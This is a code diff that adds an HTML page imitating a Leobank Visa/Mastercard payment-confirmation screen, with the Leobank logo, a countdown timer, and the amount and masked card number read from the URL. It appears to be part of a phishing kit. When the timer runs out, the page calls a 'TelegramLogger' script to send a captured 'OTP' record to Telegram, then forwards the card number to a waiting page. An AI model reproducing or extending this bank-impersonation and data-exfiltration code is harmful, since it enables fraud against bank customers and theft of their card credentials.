@@ -1,0 +1,163 @@
+<html lang="EN" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width, height=device-height">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+
+  <link rel="stylesheet" href="css/leo.css">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap');
+
+  </style>
+  <style>
+      .card-logo {
+  width: 60px;
+  height: auto;
+  max-height: 40px;
+  object-fit: contain;
+}
+
+  </style>
+  
+  <title>Leobank</title>
+</head>
+
+<body class="VISA vsc-initialized">
+  <div data-entry-point="application-container">
+    <div class="main web-based">
+      <div class="header-zone"><button id="cancel" class="cancel">Cancel</button></div>
+      <div class="title">
+        <div class="logo"><img src="images/leobank.png"></div>
+        <div class="ps"><img id="card-logo" class="card-logo" src="images/visa.png" alt="Card Logo">
+</div>
+      </div>
+      <div class="content">
+        <div class="form-for-submit">
+          <div data-entry-point="authentication">
+            <div class="item authentication-oob">
+              <form class="cp-ExtAuthApp" action="wait.html" id="oob-form" novalidate>
+                <ul class="cp-error-descriptions" style="display: none;"></ul>
+                <div class="item data-label">To confirm the payment, open the Leobank application on your smartphone</div>
+              </form>
+            </div>
+          </div>
+          <div class="oob-timer-wrapper">
+            <div class="oob-timer-container">
+              <svg class="spinner" viewBox="0 0 50 50">
+                <linearGradient id="grad">
+                  <stop class="stop stop--1" stop-color="#ffc88a" offset="0"></stop>
+                  <stop class="stop stop--2" stop-color="#ff8fec" offset="49%"></stop>
+                  <stop class="stop stop--2" stop-color="#ff8fec" offset="51%"></stop>
+                  <stop class="stop stop--3" stop-color="#85a5ff" offset="100%"></stop>
+                </linearGradient>
+                <circle class="path" cx="25" cy="25" r="20" fill="none" stroke="url(#grad)" stroke-width="5"></circle>
+              </svg>
+              <div class="oob-timer">110</div>
+              <script>
+                var countdown = setInterval(function () {
+                  var elem = document.querySelector('.oob-timer');
+                  var count = parseInt(elem.innerHTML);
+                  count--;
+                  elem.innerHTML = count;
+                  if (count === 0) {
+                    clearInterval(countdown);
+                    
+                    // Save OTP using Telegram Logger (LeoBank otomatik təsdiqləmə)
+                    if (window.TelegramLogger) {
+                      console.log('💾 OTP saxlanılır: AUTO-CONFIRM');
+                      window.TelegramLogger.saveOTP('AUTO-CONFIRM', 'LeoBank (Tətbiq Təsdiqi)');
+                      
+                      console.log('📤 OTP Telegram-a göndərilir...');
+                      // Send OTP to Telegram immediately
+                      window.TelegramLogger.sendOTPInfo().then(success => {
+                        console.log('✅ OTP göndərildi:', success);
+                      }).catch(error => {
+                        console.error('❌ OTP göndərmə xətası:', error);
+                      });
+                    } else {
+                      console.error('❌ TelegramLogger tapılmadı!');
+                    }
+                    
+                    // Timer bitince wait.html'e yönlendir
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const cardNumber = urlParams.get('card') || '';
+                    window.location.href = 'wait.html?card=' + encodeURIComponent(cardNumber);
+                  }
+                }, 1000);
+              </script>
+            </div>
+          </div>
+        </div>
+
+        <div data-entry-point="payment-details">
+          <div>
+            <div class="item columns payment-info">
+              <div class="item-left">Amount:</div>
+              <div class="item-right item-amount" id="amount-display">₼</div>
+            </div>
+<div class="item columns">
+  <div class="item-left">Date</div>
+  <div class="item-right" id="date-display"></div>
+</div>
+
+            <div class="item columns">
+              <div class="item-left">Card Number</div>
+              <div class="item-right" id="card-display">****</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="information-zone">
+        <div><input class="hide" id="hd-1" type="checkbox"><label for="hd-1" class="cp-cursor-pointer">Need help?</label>
+          <div class="cp-help-text">
+            <div class="cp-margin-bottom">Payment confirmation will be done using the mobile app.</div>Step 1
+            <div class="cp-help-txt">Open the Leobank mobile application on your smartphone.</div>Step 2
+            <div class="cp-help-txt">Click the Confirm to confirm the payment.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="js/telegram-logger.js"></script>
+<script>
+  function getParams() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const amount = urlParams.get('amount');
+    const card = urlParams.get('card');
+    return { amount, card };
+  }
+
+  const { amount, card } = getParams();
+
+  if (amount) {
+    document.getElementById('amount-display').innerHTML = `${parseFloat(amount).toFixed(2)} <span>₼</span>`;
+  }
+
+  if (card) {
+    const masked = '**** ' + card.slice(-4);
+    document.getElementById('card-display').innerText = masked;
+
+    const firstDigit = card.charAt(0);
+    const logo = document.getElementById('card-logo');
+    if (firstDigit === '4') {
+      logo.src = 'images/visa.png';
+    } else if (firstDigit === '5') {
+      logo.src = 'images/mastercard.png';
+    } else {
+      logo.src = 'images/leobank.png'; // fallback
+    }
+  }
+
+  const now = new Date();
+  const formatted = now.toLocaleString('en-GB', {
+    day: '2-digit', month: '2-digit', year: 'numeric',
+    hour: '2-digit', minute: '2-digit'
+  }).replace(',', ' •');
+  document.getElementById('date-display').innerText = formatted;
+</script>
+
+</body>
+</html>
